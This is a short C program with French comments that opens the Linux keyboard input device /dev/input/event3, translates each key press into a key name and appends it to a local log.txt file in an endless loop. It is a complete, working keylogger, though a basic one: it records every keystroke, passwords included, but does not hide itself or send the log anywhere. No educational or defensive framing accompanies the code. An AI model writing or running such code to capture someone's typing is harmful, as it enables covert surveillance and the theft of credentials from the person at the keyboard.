#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>


#define DEVICE "/dev/input/event3"

const char *key_names[] = {
    "KEY_RESERVED", "KEY_ESC", "KEY_1", "KEY_2", "KEY_3", "KEY_4", "KEY_5", "KEY_6", "KEY_7", "KEY_8", 
    "KEY_9", "KEY_0", "KEY_MINUS", "KEY_EQUAL", "KEY_BACKSPACE", "KEY_TAB", "KEY_Q", "KEY_W", "KEY_E", 
    "KEY_R", "KEY_T", "KEY_Y", "KEY_U", "KEY_I", "KEY_O", "KEY_P", "KEY_LEFTBRACE", "KEY_RIGHTBRACE", 
    "KEY_ENTER", "KEY_LEFTCTRL", "KEY_A", "KEY_S", "KEY_D", "KEY_F", "KEY_G", "KEY_H", "KEY_J", "KEY_K", 
    "KEY_L", "KEY_SEMICOLON", "KEY_APOSTROPHE", "KEY_GRAVE", "KEY_LEFTSHIFT", "KEY_BACKSLASH", "KEY_Z", 
    "KEY_X", "KEY_C", "KEY_V", "KEY_B", "KEY_N", "KEY_M", "KEY_COMMA", "KEY_DOT", "KEY_SLASH", 
    "KEY_RIGHTSHIFT", "KEY_KPASTERISK", "KEY_LEFTALT", "KEY_SPACE", "KEY_CAPSLOCK", "KEY_F1", "KEY_F2", 
    "KEY_F3", "KEY_F4", "KEY_F5", "KEY_F6", "KEY_F7", "KEY_F8", "KEY_F9", "KEY_F10", "KEY_NUMLOCK", 
    "KEY_SCROLLLOCK", "KEY_KP7", "KEY_KP8", "KEY_KP9", "KEY_KPMINUS", "KEY_KP4", "KEY_KP5", "KEY_KP6", 
    "KEY_KPPLUS", "KEY_KP1", "KEY_KP2", "KEY_KP3", "KEY_KP0", "KEY_KPDOT"
    // Ajoutez plus de noms de touches si nécessaire
};

// Fonction pour convertir ev.code en texte
const char *get_key_text(unsigned int code) {
    if (code < sizeof(key_names) / sizeof(key_names[0])) {
        return key_names[code];
    }
    return "UNKNOWN_KEY";
}


int main() {
	
	int fd = open(DEVICE, O_RDONLY);
       	if (fd < 0) {
		perror("Erreur dans l'ouverture de fichier de périphérique.");
		exit(EXIT_FAILURE);
	}

	struct input_event ev;

	FILE * logfile;
	logfile = fopen("log.txt", "a");
	if (!logfile) {
		perror("Erreur dans l'ouverture de fichier log.txt");
		close(fd);
		exit(EXIT_FAILURE);
	}

	ssize_t n;
	while(1) {
		n = read(fd, &ev, sizeof(ev));
		if (n < 0) {
			perror("Erreur de lecture de l'événement d'entrée.");
			fclose(logfile);
			close(fd);
			exit(EXIT_FAILURE);
		} else if (n != sizeof(ev)) {
			fprintf(stderr, "Taille d'événement incorrecte\n");
			fclose(logfile);
			close(fd);
			exit(EXIT_FAILURE);
		}

		if (ev.type == EV_KEY && ev.value == 1) {
			fprintf(logfile, " %s | ", get_key_text(ev.code));
			fflush(logfile);
		}

	}
	fclose(logfile);
	close(fd);
	return 0;
}














